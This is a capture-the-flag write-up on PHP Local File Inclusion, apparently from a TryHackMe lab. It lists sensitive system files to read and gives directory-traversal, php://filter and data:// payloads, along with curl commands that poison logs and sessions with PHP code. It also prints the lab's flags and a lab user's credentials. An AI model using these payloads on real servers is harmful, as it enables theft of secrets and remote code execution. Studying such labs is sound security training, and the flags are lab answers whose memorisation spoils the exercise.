# Patch Management is Hard
### Category: Web Exploitation

Covers the basics of a Local File Inclusion (LFI) Vulnerability, including how to identity and test for LFI


#### What is LFI Vulnerability
An `LFI` vulnerability is found in various web apps. Ex) In PHP, the following functions cause this vulnerability

- `include`
- `require`
- `include_once`
- `require_once`

Allows atackers to include and read local files on thes server. An `LFI` vulnerability occurs with a developer's lack of security awareness.

#### What is the risk of LFI?
One of the most significant risks is leaking of sensitive data if an attacker can gain access to that sensitive data. Sometimes can be upgraded and chained to `RCE` (Remote Code Execution). 

#### Identifying and Testing for LFI
Attackers are usually interested in HTTP parameters to manipulate the input and inject payloads to see on the web app behaves. An entry point could be HTTP `GET` or `POST` parameters that pass an argument or data to the web server.

http://webapp.thm/get.php?file=userCV.pdf

**http://** -> Protocol
**webapp.thm** -> Domain Name
**get.php** -> File name
**?** -> Query string begin
**file** -> parameters

Once you find an entry point, we need to understand how this data could be processed within the application. The following example of PHP code is vulnerability to LFI

```scheme
<?PHP
	include($_GET["file"]);
?>
```

The PHP code uses a `GET` request via the URL parameter *file* to include the file on thep age. 

Other entry points can be used depending on the web app, including *User-Agent*, *Cookies*, *session*, and other HTTP headers

Now that we have the entry point, let's test for reading local files on the system. In Linux, some files that have sensitive information

- */etc/issue*
- */etc/passwd*
- */etc/shadow*
- */etc/group*
- */etc/hosts*
- */etc/motd*
- */etc/mysql/my.cnf*
- */proc/[0-9]*/fd/[0-9]*
- */proc/self/environ*
- */proc/version*
- */proc/cmdline*

###### Techniques to try...
- A direct file inclusion such as `/etc/passwd`
- using `..` to get out of the current directory
- Bypassing filters using `....//`
- URL encoding techniques (such as double encoding)

#### Exploiting LFI
Exploiting LFI is sometimes limited and depends on the web app server configuration. Besides reading sensitive data, remove code execution is something we want. If we're dealing with a PHP web app, then we can use a PHP-supported Wrapper.

#### PHP Filter
The PHP filter wrapper is used in LFI to read the actual PHP page content. Normally it's not possible to see the actual contents of the PHP on a page. Use a PHP filter to display the contents of PHP files in  other encoding formats such as `base64` or `ROT13`

#### PHP DATA
The PHP wrapper is used to include raw plain text or base64 encoded data. It is used to include images on the current page. It is being used in LFI exploit

```scheme
echo "AoC3 is fun!" | base64
```

```scheme
http://example.thm.labs/page.php?file=data://text/plain;base64,QW9DMyBpcyBmdW4hCg==
```

#### LFI to RCE via Log files
Also called a log poisoning attack. If you can cause what you want to be executed to show up in the log files, then request that page it will execute.

The log page stores four different headers, including the *username*, *IP address*, *User-Agent*, and the visited page. The `User-Agent` is an HTTP header that includes the user's browsers information to let servers identify the type of OS, vendor, and version. The `User-Agent` is one of the HTTP headers that the user can control. We need to include PHP code into the `User-Agent` to get RCE.

Testing to see if it shows in the logs
```scheme
curl -A "Testing" http://10-10-241-126.p.thmlabs.com/login.php
```
Log file updated
```scheme
Guest:172.17.0.1:Testing:/login.php
```

Injecting PHP code into the User-Agent
```scheme
curl -A "<?php phpinfo();?>" http://10-10-241-126.p.thmlabs.com/login.php
```

#### LFI to RCE via PHP Sessions
Follows the same technique as the log poisoning technique. PHP sessions are files within the OS that store temporary information. After the user logs out of the web app, the PHP session ifnormation will be deleted. This technique requires enumeration to read the PHP configuration first. Common locations where PHP stores this data
```scheme
C:\Windows\Temp
/tmp/
/var/lib/php5
/var/lib/php/session
```

This specific web app, it stores the PHP sessions in the `/tmp` directory. It also stores the value of the username into the session even if you are not logged in since this value is needed by the developer to use it in the logs function. We injec the PHP code into the user section in the following way

```scheme
Username:
<?php phpinfo();?>
Password:
asdf
```

Default naming schema for PHP is to do `sess_<SESSION_ID>` so if the cookie value is `vc4567al6pq7usm2cufmilkm45` therefore the file stored in `/tmp` will be `sess_vc4567al6pq7usm2cufmilkm45`. Now we can use LFI to call the session file.

## Question 1
##### What is the entry point for our web application?
The HTTP paramter `err` is set to grab the file to display

## Question 2
##### Use the entry point to perform `LFI` to read `/etc/flag`
Used the directory traversal technique `../../../../etc/flag`

THM{d29e08941cf7fe41df55f1a7da6c4c06}

## Question 3
##### Use PHP filter technique to read source code of `index.php`

`index.php?err=php://filter/convert.base64-encode/resource=index.php`

Returns *base64* encoded string. When decoded reveals the *$flag* variable.

THM{791d43d46018a0d89361dbf60d5d9eb8}

## Question 4
##### Find McSkidy's missing credentials
In `index.php` the source code shows that the file `creds.php` is included in the path `./includes/creds.php`. The same technique is used to spit out the source code in encoded *base64* and then decoded to find his credentials.

`php://filter/convert.base64-encode/resource=./includes/creds.php`

```scheme
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
```

## Question 5
##### Use McSkidy's credentials to login and find server password
`flag.thm.aoc` server -> THM{552f313b52e3c3dbf5257d8c6db7f6f1}


## Question 6
##### Use the LFI to gain RCE via the log file page. What is hostname?
The log file is located at `./includes/logs/app_access.log`

payload
```scheme
curl -A "<?php echo php_uname('n');?>" http://...
```

hostname -> lfi-aoc-awesome-59aedca683fff9261263bb084880c965


## Bonus
##### Use current PHP configuration stores the PHP session in `/tmp`. Use the LFI to call the PHP session file to get PHP code executed

